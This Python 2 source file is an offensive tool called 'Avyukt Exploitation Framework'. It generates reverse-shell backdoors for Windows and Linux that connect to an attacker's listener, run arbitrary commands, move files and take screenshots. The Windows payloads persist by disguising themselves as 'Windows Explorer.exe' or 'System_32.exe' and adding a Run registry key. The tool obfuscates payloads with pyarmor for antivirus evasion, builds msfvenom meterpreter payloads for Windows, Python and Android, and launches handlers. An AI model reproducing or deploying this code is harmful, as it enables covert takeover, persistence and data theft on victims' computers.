#!/usr/bin/env python2
try:
    import os
    import subprocess
    import pyfiglet
    import re
    import platform
    from colorama import Fore
    from os import system, name
    import time
    import sys

except ImportError:
    print(Fore.RED + "[+] Dependency Error")
    print(Fore.RED + "[+] Found Missing Dependencies, Please run setup.py")
    sys.exit()

def gen_nor_python_back():
    name = raw_input("Avyukt>: Please enter Payload name >> ")
    ip = raw_input("\nAvyukt>: Enter LHOST >> ")
    port = raw_input("\nAvyukt>: Enter LPORT >> ")
    with open("Output/" + name + ".py", "w") as file:
        file.write('''
import socket, subprocess, json, os, base64, sys, shutil, urllib, pyscreeze
class Backdoor:
    def __init__(self, ip, port):
        self.become_pers()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_pers(self):
        evil_file_loc = os.environ["appdata"] + "\Windows Explorer.exe"
        if not os.path.exists(evil_file_loc):
            shutil.copyfile(sys.executable, evil_file_loc)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Start /t REG_SZ /d "' + evil_file_loc + '"', shell=True)


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Changing Working Directory to" + path

    def read(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write(self, path, content):
        with open(path, "wb") as file
            file.write(base64.b64decode(content))
            return "[+] File has been uploaded!"

    def screenshot(self):
        image = pyscreeze.screenshot('Image.jpg')
        return "Screenshot saved as Image.jpg"

    def run(self):
        while True:
            command = self.reliable_receive()

            try:

                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    self.change_directory(command[1])

                elif command[0] == "download":
                    command_result = self.read(command[1])

                elif command[0] == "upload":
                    command_result = self.write(command[1], command[2])

                elif command[0] == "snapshot":
                    command_result = self.screenshot()

                else:
                    command_result = self.execute_system_command(command)

            except Exception:
                command_result = "[-] Error During command execution"

            self.reliable_send(command_result)


vedant_backdoor = Backdoor("''' + ip + '''", ''' + port + ''')
vedant_backdoor.run()

            ''')
    print(Fore.GREEN + "\nAvyukt>: Python Payload was generated in the Output Folder, Please check!")
    start_handler = raw_input(
        Fore.CYAN + "\nAvyukt>: Do you want to start the default handler for Avyukt Payload? y/n >> ")
    if "y" in start_handler:
        clear_screen()
        print("Avyukt>: Please wait, Starting Handler ... ")
        time.sleep(3)
        clear_screen()
        start_avyukt_handler()

    if "n" in start_handler:
        raw_input("\nAvyukt>: Press enter to continue ... ")


def start_avyukt_handler():
    os.system("python Handlers/Avyukt_handler.py")


def generate_non_obf_avyukt():
    name = raw_input("Avyukt>: Please enter Payload name >> ")
    ip = raw_input("\nAvyukt>: Enter LHOST >> ")
    port = raw_input("\nAvyukt>: Enter LPORT >> ")
    with open("Output/" + name + ".py", "w") as file:
        file.write('''

import socket, subprocess, json, os, base64, sys, shutil, urllib, pyscreeze
class Backdoor:
    def __init__(self, ip, port):
        self.become_pers()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_pers(self):
        evil_file_loc = os.environ["appdata"] + "\Windows Explorer.exe"
        if not os.path.exists(evil_file_loc):
            shutil.copyfile(sys.executable, evil_file_loc)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Start /t REG_SZ /d "' + evil_file_loc + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Changing Working Directory to" + path

    def read(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return"[+] File has been uploaded!"

    def screenshot(self):
        image = pyscreeze.screenshot('Image.jpg')
        return "Screenshot saved as Image.jpg"


    def run(self):
        while True:
            command = self.reliable_receive()

            try:

                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    self.change_directory(command[1])

                elif command[0] == "download":
                    command_result = self.read(command[1])

                elif command[0] == "upload":
                    command_result = self.write(command[1], command[2])

                elif command[0] == "snapshot":
                    command_result = self.screenshot()

                else:
                    command_result = self.execute_system_command(command)

            except Exception:
                command_result = "[-] Error During command execution"

            self.reliable_send(command_result)


vedant_backdoor = Backdoor("''' + ip + '''", ''' + port + ''')
vedant_backdoor.run()
        ''')
    try:
        ask_for_icon = raw_input("\nAvyukt>: Do you want to add a icon to the generated EXE? y/n >> ")
        if "y" in ask_for_icon:
            print("\nAvyukt>: Script Path Output/" + name + ".py")
            ask_path = raw_input("\nAvyukt>: Please enter Script Path >> ")
            ask_icon_path = raw_input("\nAvyukt>: Please enter path to icon (.ico files are only supported) >> ")
            subprocess.call(['wine', '/root/.wine/drive_c/Python27/Scripts/pyinstaller', '--onefile', '--noconsole', '--icon', ask_icon_path, 'Output/' + name + '.py'])
            os.remove("Output/" + name + ".py")
            print(Fore.GREEN + "\nAvyukt>: Backdoor was compiled successfully. Please check dist/" + name + ".exe")

        start_handler = raw_input(Fore.CYAN + "\nAvyukt>: Do you want to start the default handler for Avyukt Payload? y/n >> ")
        if "y" in start_handler:
            clear_screen()
            print("Avyukt>: Please wait, Starting Handler ... ")
            time.sleep(3)
            clear_screen()
            start_avyukt_handler()

        if "n" in start_handler:
            print("")

        if "n" in ask_for_icon:
            ask_path = raw_input("\nAvyukt>: Please enter Script Path >> ")
            subprocess.call(['wine', '/root/.wine/drive_c/Python27/Scripts/pyinstaller.exe', '--noconsole', '--onefile', 'Output/' + name + '.py'])
            os.remove("Output/" + name + ".py")
            print(Fore.GREEN + "\nAvyukt>: Backdoor was compiled successfully. Please check Output/dist/" + name + ".exe")
            start_handler = raw_input(Fore.CYAN + "\nAvyukt>: Do you want to start the default handler for Avyukt Payload? y/n >> ")
        if "y" in start_handler:
            clear_screen()
            print("Avyukt>: Please wait, Starting Handler ... ")
            time.sleep(3)
            clear_screen()
            start_avyukt_handler()

        if "n" in start_handler:
            raw_input("\nAvyukt>: Press enter to continue ... ")
    except Exception:
        print("Avyukt>: Error occured while compiling the script, Please run it again")


def avyukt_nc_payload_gen():
    name = raw_input("Avyukt>: Please enter Payload name >> ")
    ip = raw_input("\nAvyukt>: Enter LHOST >> ")
    port = raw_input("\nAvyukt>: Enter LPORT >> ")
    with open("Output/" + name + ".py", "w") as file:
        file.write('''
# coding: utf-8

import socket

import time

import subprocess


def connect(ip, port):
    try:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect((ip, port))

        s.send('[1;32m[!] Connection Received ')

        return s

    except Exception as e:

        print
        "Connection Error: ", e

        return None


def listen(s):
    try:

        while True:

            data = s.recv(1024)

            if data[0:-1] == 'exit':

                s.close()

                exit(0)

            else:

                cmd(s, data[:-1])

    except:

        error(s)


def cmd(s, data):
    try:

        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        saida = proc.stdout.read() + proc.stderr.read()

        s.send(saida + "")

    except:

        error(s)


def error(s):
    if s:
        s.close()

    main2()


def main2():
    if s:
        s.close()

    while True:

        s_conectado = connect("''' + ip + '''", ''' + port + ''')

        if s_conectado:

            listen(s_conectado)

        else:

            print
            "Connection Failed, Trying Again..."

            time.sleep(10)


s = None

main2()

arq.close()

os.system("python3 .handler.py &>> /dev/null")

''')
    try:

        ask_for_icon = raw_input("\nAvyukt>: Do you want to add a icon to the generated EXE? y/n >> ")
        if "y" in ask_for_icon:
            print("\nAvyukt>: Script Path Output/" + name + ".py")
            ask_icon_path = raw_input("\nAvyukt>: Please enter path to icon (.ico files are only supported) >> ")
            subprocess.call(['wine', '/root/.wine/drive_c/Python27/Scripts/pyarmor.exe', 'pack', '-e', '--onefile --noconsole --icon %s' % ask_icon_path, 'Output/' + name + '.py'])
            os.remove("Output/" + name + ".py")
            print(Fore.GREEN + "\nAvyukt>: Backdoor was compiled successfully. Please check Output/dist/" + name + ".exe")

        if "n" in ask_for_icon:
            print("\nAvyukt>: Script Path Output/" + name + ".py")
            subprocess.call(['wine', '/root/.wine/drive_c/Python27/Scripts/pyarmor.exe', 'pack', '-e', '--onefile --noconsole', 'Output/' + name + '.py'])
            os.remove("Output/" + name + ".py")
            print(Fore.GREEN + "\nAvyukt>: Backdoor was compiled successfully. Please check Output/dist/" + name + ".exe")

    except Exception:
        print("Avyukt>: Error occured while compiling the script, Please run it again")



def avyukt_payload_gen():
    name = raw_input("Avyukt>: Please enter Payload name >> ")
    ip = raw_input("\nAvyukt>: Enter LHOST >> ")
    port = raw_input("\nAvyukt>: Enter LPORT >> ")
    with open("Output/" + name + ".py", "w") as file:
        file.write('''
import socket, subprocess, json, os, base64, sys, shutil, urllib, pyscreeze

class Backdoor:
    def __init__(self, ip, port):
        self.become_pers()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_pers(self):
        evil_file_loc = os.environ["appdata"] + "\System_32.exe"
        if not os.path.exists(evil_file_loc):
            shutil.copyfile(sys.executable, evil_file_loc)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Start /t REG_SZ /d "' + evil_file_loc + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Changing Working Directory to" + path

    def read(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return"[+] File has been uploaded!"

    def snapshot(self):
        screenshot = pyscreeze.screenshot("Image.jpg")
        return "Screenshot saved as Image.JPG"

    def run(self):
        while True:
            command = self.reliable_receive()

            try:

                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    self.change_directory(command[1])

                elif command[0] == "download":
                    command_result = self.read(command[1])

                elif command[0] == "upload":
                    command_result = self.write(command[1], command[2])

                elif command[0] == "snapshot":
                    command_result = self.snapshot()


                else:
                    command_result = self.execute_system_command(command)

            except Exception:
                command_result = "[-] Error During command execution"

            self.reliable_send(command_result)

try:
    vedant_backdoor = Backdoor("''' + ip + '''", ''' + port + ''')
    vedant_backdoor.run()
except Exception:
    sys.exit()
        ''')
    try:

        ask_for_icon = raw_input("\nAvyukt>: Do you want to add a icon to the generated EXE? y/n >> ")
        if "y" in ask_for_icon:
            print("\nAvyukt>: Raw Script Path Output/" + name + ".py")
            ask_icon_path = raw_input("\nAvyukt>: Please enter path to icon (.ico files are only supported) >> ")
            print("\nAvyukt>: Please wait, Starting to Obfuscate the Scripts")
            print("\n")
            subprocess.call(['wine', '/root/.wine/drive_c/Python27/Scripts/pyarmor.exe', 'pack', '-e', '--onefile --noconsole --icon %s' % ask_icon_path, 'Output/' + name + '.py'])
            os.remove("Output/" + name + ".py")
            print(Fore.GREEN + "\nAvyukt>: Backdoor was compiled successfully. Please check Output/dist/" + name + ".exe")
            start_handler = raw_input(Fore.CYAN + "\nAvyukt>: Do you want to start the default handler for Avyukt Payload? y/n >> ")
            if "y" in start_handler:
                clear_screen()
                print("Avyukt>: Please wait, Starting Handler ... ")
                time.sleep(3)
                clear_screen()
                start_avyukt_handler()

            if "n" in start_handler:
                raw_input("\nAvyukt>: Press enter to continue ... ")

        if "n" in ask_for_icon:
            print("\nAvyukt>: Raw Script Path Output/" + name + ".py")
            print("Avyukt>: Please wait, Starting to Obfuscate the Scripts")
            print("\n")
            subprocess.call(['wine', '/root/.wine/drive_c/Python27/Scripts/pyarmor.exe', 'pack', '-e', '--onefile --noconsole', 'Output/' + name + '.py'])
            os.remove("Output/" + name + ".py")
            print(Fore.GREEN + "\nAvyukt>: Backdoor was compiled successfully. Please check Output/dist/" + name + ".exe")
            start_handler = raw_input(Fore.CYAN + "\nAvyukt>: Do you want to start the default handler for Avyukt Payload? y/n >> ")

            if "y" in start_handler:
                clear_screen()
                print("Avyukt>: Please wait, Starting Handler ... ")
                time.sleep(3)
                clear_screen()
                start_avyukt_handler()

            if "n" in start_handler:
                print("")

    except Exception:
        print("Avyukt>: Error occured while compiling the script, Please run it again")

def linux():
    name = raw_input("Avyukt>: Please enter Payload name >> ")
    ip = raw_input("\nAvyukt>: Enter LHOST >> ")
    port = raw_input("\nAvyukt>: Enter LPORT >> ")
    with open("Output/" + name + ".py", "w") as file:
        file.write('''

import socket, subprocess, json, os, base64, sys, shutil, urllib, pyscreeze
class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Changing Working Directory to" + path

    def read(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return"[+] File has been uploaded!"

    def screenshot(self):
        image = pyscreeze.screenshot('Image.jpg')
        return "Screenshot saved as Image.jpg"


    def run(self):
        while True:
            command = self.reliable_receive()

            try:

                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    self.change_directory(command[1])

                elif command[0] == "download":
                    command_result = self.read(command[1])

                elif command[0] == "upload":
                    command_result = self.write(command[1], command[2])

                elif command[0] == "snapshot":
                    command_result = self.screenshot()

                else:
                    command_result = self.execute_system_command(command)

            except Exception:
                command_result = "[-] Error During command execution"

            self.reliable_send(command_result)


vedant_backdoor = Backdoor("''' + ip + '''", ''' + port + ''')
vedant_backdoor.run()
        ''')
        print("\nAvyukt>: Please wait, Compiling Backdoor to Linux Executable")
        print("\n")
        subprocess.call("pyinstaller --onefile --noconsole " + "Output/" + name + ".py", shell=True)
        print(Fore.GREEN + "\nAvyukt>: Backdoor was compiled to Linux executable successfully, Please check dist folder")
        start_handler = raw_input(Fore.CYAN + "\nAvyukt>: Do you want to start the default handler for Avyukt Payload? y/n >> ")
        if "y" in start_handler:
            clear_screen()
            print("Avyukt>: Please wait, Starting Handler ... ")
            time.sleep(3)
            clear_screen()
            start_avyukt_handler()

        if "n" in start_handler:
            raw_input("\nAvyukt>: Press enter to continue ... ")


def msfconsole():
    subprocess.call("msfconsole", shell=True)


def ascii_menu():
    ascii_banner_menu = pyfiglet.figlet_format("Avyukt Evasion")
    print(ascii_banner_menu)


def list_info():
    print(Fore.RED + "\n\t\tAvyukt Payloads for Windows" + Fore.WHITE + " (Excellent)")
    print(Fore.WHITE + "\n\t\t[1] python/Avyukt/reverse_tcp " + Fore.RED + "(Highly Obfuscated exe)")
    print(Fore.WHITE + "\n\t\t[2] python/Avyukt_NC/reverse_tcp")
    print(Fore.WHITE + "\n\t\t[3] python/Avyukt/reverse_tcp " + Fore.RED + "(Non - Obfuscated exe)")
    print(Fore.WHITE + "\n\t\t[4] python/Avyukt/reverse_tcp " + Fore.RED + "(Python File)")
    print(Fore.RED + "\n\t\tAvyukt Payloads for Linux" + Fore.WHITE + " (Good)")
    print(Fore.WHITE + "\n\t\t[5] python/Avyukt/reverse_tcp (Linux)")
    print(Fore.RED + "\n\t\tMsfVenom Payloads " + Fore.WHITE + "(Poor)")
    print(Fore.WHITE + "\n\t\t[6] windows/meterpreter/reverse_https")
    print(Fore.WHITE + "\n\t\t[7] windows/meterpreter/reverse_tcp")
    print(Fore.WHITE + "\n\t\t[8] windows/meterpreter/reverse_http")
    print(Fore.RED + "\n\t\tNormal Python Payloads" + Fore.WHITE + " (Good)")
    print(Fore.WHITE + "\n\t\t[9] python/meterpreter/reverse_https")
    print(Fore.WHITE + "\n\t\t[10] python/meterpreter/reverse_tcp")
    print(Fore.WHITE + "\n\t\t[11] python/meterpreter/reverse_http")
    print(Fore.RED + "\n\t\tAndroid Backdoors" + Fore.WHITE + " (Good)")
    print(Fore.WHITE + "\n\t\t[12] android/meterpreter/reverse_tcpz")
    print(Fore.WHITE + "\n\t[+] Press Enter to return to Menu")


def help():
    print("\n\t[+] Type 1 if you want to use " + Fore.RED + "Evasion" + Fore.WHITE)
    print("\n\t[+] Type 2 if you want to use In Built " + Fore.RED + "Listener")
    print(Fore.WHITE + "\n\t[+] Type 4 to exit Framework")


def clear_screen():
    if name == 'nt':
        _ = system('cls')

    else:
        _ = system('clear')


def details(version, Operating_System, release):
    print(Fore.WHITE + "\n[+] Avyukt Version Build : " + Fore.WHITE + version)
    print("[+] Checking for Output Directory!")
    time.sleep(3)
    if not os.path.exists("Output"):
        print("[+] Output Directory was not found, Creating one")
        print("[+] Creating Output Directory")
        os.mkdir("Output")
        print("[+] Sucessfully created Output Directory!")
    else:
        print("[+] Output Directory Found!")
    print(Fore.WHITE + "[+] OS Release : " + release)
    print(Fore.WHITE + "[+] Detected System Name : " + Fore.WHITE + Operating_System)
    print(Fore.WHITE + "[+] All dependencies installed")
    raw_input(Fore.WHITE + "\nAvyukt>: Press enter to continue >> ")


def menu():
    while True:
        print(Fore.WHITE)
        ascii_banner_menu = pyfiglet.figlet_format("Avyukt Menu")
        print(ascii_banner_menu)
        print("\n\tVersion 1.0 (Beta)")
        print(Fore.WHITE + "\n\t==============")
        print(Fore.WHITE + "\tCore Commands")
        print(Fore.WHITE + "\t==============")
        print(Fore.WHITE + "\n\t\tCommands" + "\tDescription")
        print(Fore.RED + "\n\t\t1) Evasion" + "\tA list of payloads to exploit target")
        print(Fore.RED + "\t\t2) Listener" + "\tA list of handlers to recieve reverse connection")
        print(Fore.RED + "\t\t3) Help" + "\t\tA list of commands and how to use them")
        print(Fore.RED + "\t\t4) Exit" + "\t\tExit the framework")
        print(Fore.WHITE + "\n\tMenu Info")
        print(Fore.WHITE + "\n\t\tNumber of Listeners : " + Fore.GREEN + "3")
        print(Fore.WHITE + "\t\tNumber of Payloads : " + Fore.GREEN + "12")
        print(Fore.WHITE + "\t\tDeveloped by : " + Fore.GREEN + "Vedant Bhalgama")
        command = raw_input(Fore.WHITE + "\nAvyukt>: ")

        if "1" in command:
            clear_screen()
            ascii_menu()
            print(Fore.RED + "\n[+] Select the payload you want to use, Only This Is available for now")
            list_info()
            payload_selection = raw_input(Fore.WHITE + "\nAvyukt" + Fore.RED + "(Evasion)" + Fore.WHITE + ">: ")
            if "1" in payload_selection:
                clear_screen()
                avyukt_payload_gen()
            if "2" in payload_selection:
                clear_screen()
                avyukt_nc_payload_gen()
            if "3" in payload_selection:
                clear_screen()
                generate_non_obf_avyukt()

            if "4" in payload_selection:
                clear_screen()
                gen_nor_python_back()

            if "5" in payload_selection:
                clear_screen()
                linux()

            if "6" in payload_selection:
                clear_screen()
                iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
                prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
                if os.path.exists("Output"):
                    subprocess.call("msfvenom --platform Windows --payload windows/meterpreter/reverse_https LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe", shell=True)
                else:
                    subprocess.call("msfvenom --platform Windows --payload windows/meterpreter/reverse_https LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe",  shell=True)

            if "7" in payload_selection:
                clear_screen()
                iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
                prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
                if os.path.exists("Output"):
                    subprocess.call("msfvenom --platform Windows --payload windows/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe", shell=True)
                else:

                    subprocess.call("msfvenom --platform Windows --payload windows/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe", shell=True)

            if "8" in payload_selection:
                clear_screen()
                iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
                prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")

                if os.path.exists("Output"):
                    subprocess.call("msfvenom --platform Windows --payload windows/meterpreter/reverse_http LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe", shell=True)
                else:
                    os.mkdir("Output")
                    subprocess.call("msfvenom --platform Windows --payload windows/meterpreter/reverse_http LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe", shell=True)
            if "9" in payload_selection:
                clear_screen()
                iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
                prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")

                if os.path.exists("Output"):
                    subprocess.call("msfvenom --payload python/meterpreter/reverse_https LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py", shell=True)
                else:
                    os.mkdir("Output")
                    subprocess.call("msfvenom --payload python/meterpreter/reverse_https LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py", shell=True)

            if "10" in payload_selection:
                clear_screen()
                iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
                prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
                if os.path.exists("Output"):
                    subprocess.call("msfvenom --payload python/meterpreter/reverse_http LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py", shell=True)
                else:
                    os.mkdir("Output")
                    subprocess.call("msfvenom --payload python/meterpreter/reverse_http LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py", shell=True)

            if "11" in payload_selection:
                clear_screen()
                iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
                prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
                if os.path.exists("Output"):
                    subprocess.call("msfvenom --payload python/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py", shell=True)
                else:
                    os.mkdir("Output")
                    subprocess.call("msfvenom --payload python/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py", shell=True)

            if "12" in payload_selection:
                iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
                prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
                if os.path.exists("Output"):
                    subprocess.call("msfvenom --payload android/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".apk", shell=True)
                else:
                    os.mkdir("Output")
                    subprocess.call("msfvenom --payload android/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".apk", shell=True)

        if "2" in command:
            clear_screen()
            ascii_banner_menu = pyfiglet.figlet_format("Avyukt Handlers")
            print(ascii_banner_menu)
            print(Fore.RED + "\n\t[+] Handler Menu")
            print(Fore.WHITE + "\n\t\t[1] Avyukt Handler (Works with python/Avyukt/reverse_tcp Payload in Evasion Menu)")
            print(Fore.WHITE + "\n\t\t[2] msfconsole (Works only with meterpreter Payloads in Evasion Menu)")
            print(Fore.WHITE + "\n\t\t[3] NetCat Listener (Works only with PowerShell Payload and avyukt_NC in Evasion Menu)")
            print(Fore.WHITE + "\n\t[+] Press Enter to go back")
            handler_chooser = raw_input(Fore.WHITE + "\nAvyukt" + Fore.RED + "(Handlers)" + Fore.WHITE + ">: ")

            if "1" in handler_chooser:
                clear_screen()
                subprocess.call("python Handlers/Avyukt_handler.py", shell=True)

            if "2" in handler_chooser:
                msfconsole()
            if "3" in handler_chooser:
                lport = raw_input("[+] Enter LPORT to listen on >> ")
                clear_screen()
                os.system("nc -lvp " + lport)

        if "3" in command:
            help()

        if "4" in command:
            print("\nAvyukt>: Please wait, Shutting down program ... ")
            subprocess.call("service apache2 stop", shell=True)
            os.system("reset")
            sys.exit()

        raw_input(Fore.RED + "\nAvyukt>: Press Enter to continue ... ")

        clear_screen()


def startup():
    os.system("clear")
    ascii_banner = pyfiglet.figlet_format("Avyukt")
    print(ascii_banner)
    print(Fore.RED + "\n[+] Hack your target with Avyukt Exploitation Framework")
    details("1.0 (Beta)", platform.system(), platform.release())
    clear_screen()
    menu()


startup()
